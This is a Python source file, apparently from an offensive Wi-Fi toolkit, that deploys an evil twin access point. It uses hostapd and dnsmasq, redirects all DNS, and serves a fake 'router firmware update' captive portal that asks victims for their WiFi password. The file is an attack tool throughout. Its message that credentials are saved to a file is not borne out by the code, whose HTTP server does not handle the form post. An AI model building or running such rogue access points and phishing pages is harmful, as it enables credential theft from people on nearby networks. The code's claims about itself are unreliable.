#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import subprocess
import tempfile
import time
import os
from utils.hardware import interface, hardware_available, adapter_detected
from utils.interface import enable_monitor_mode, set_channel
from utils.status import print_status
from utils.process import active_processes, add_process, remove_process
from utils.logger import log_capture


def evil_twin_attack(ssid: str, channel: str = "1", wpa2: bool = False, passphrase: str = "JesterSploit") -> bool:
    """Deploy an Evil Twin AP with captive portal."""
    if not hardware_available or not adapter_detected:
        print_status("No USB adapter detected", "error")
        return False

    print_status(f"Evil twin deployment: {ssid} (ch{channel})", "info")
    mon_iface = enable_monitor_mode(interface)
    if not mon_iface:
        print_status("Monitor mode failed", "error")
        return False

    if not set_channel(channel):
        return False

    # Create managed AP interface
    ap_iface = f"{mon_iface}ap"
    try:
        subprocess.run(["iw", "dev", mon_iface, "interface", "add", ap_iface, "type", "managed"], capture_output=True)
        subprocess.run(["ip", "link", "set", ap_iface, "up"], capture_output=True)
    except:
        ap_iface = mon_iface  # fallback

    # hostapd config
    hostapd_conf = f"""interface={ap_iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
    if wpa2:
        hostapd_conf += f"""
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
wpa_passphrase={passphrase}
"""
    hostapd_conf_file = tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False)
    hostapd_conf_file.write(hostapd_conf)
    hostapd_conf_file.close()

    # dnsmasq config
    dnsmasq_conf = f"""interface={ap_iface}
dhcp-range=192.168.1.100,192.168.1.200,255.255.255.0,24h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
address=/#/192.168.1.1
"""
    dnsmasq_conf_file = tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False)
    dnsmasq_conf_file.write(dnsmasq_conf)
    dnsmasq_conf_file.close()

    # Captive portal
    portal_dir = tempfile.mkdtemp()
    portal_html = """<!DOCTYPE html>
<html>
<head><title>WiFi Security Update</title>
<style>
body{background:#0a0e1a;color:#00ffaa;font-family:'Courier New',monospace;text-align:center;padding-top:100px;}
input{background:#1a1e2a;color:#00ffaa;border:1px solid #00ffaa;padding:12px;width:300px;}
button{background:#00ffaa;color:#0a0e1a;border:none;padding:12px 24px;cursor:pointer;}
.log{position:fixed;bottom:10px;left:10px;font-size:10px;color:#666;}
</style>
</head>
<body>
<h2>⚠ SECURITY UPDATE REQUIRED ⚠</h2>
<p>Your router firmware is out of date. Enter credentials to continue.</p>
<form method="POST" action="/">
<input type="password" name="password" placeholder="WiFi Password">
<button type="submit">Update</button>
</form>
<div class="log">Session: """ + os.environ.get('SESSION_ID', 'unknown') + """</div>
</body>
</html>"""
    with open(f"{portal_dir}/index.html", 'w') as f:
        f.write(portal_html)

    # Start services
    hostapd_proc = subprocess.Popen(["hostapd", hostapd_conf_file.name],
                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    dnsmasq_proc = subprocess.Popen(["dnsmasq", "-C", dnsmasq_conf_file.name, "-d"],
                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    http_proc = subprocess.Popen(["python3", "-m", "http.server", "80", "--directory", portal_dir],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    add_process(hostapd_proc)
    add_process(dnsmasq_proc)
    add_process(http_proc)

    print_status(f"Evil twin '{ssid}' operational", "success")
    print_status("Captured credentials will be saved in /tmp/evil_twin_creds.txt", "info")
    # Simple monitoring loop
    try:
        with open("/tmp/evil_twin_creds.txt", 'a') as f:
            f.write(f"Session: {os.environ.get('SESSION_ID', 'unknown')}\n")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print_status("Evil twin stopped", "info")
        # Cleanup is done by global kill
    return True
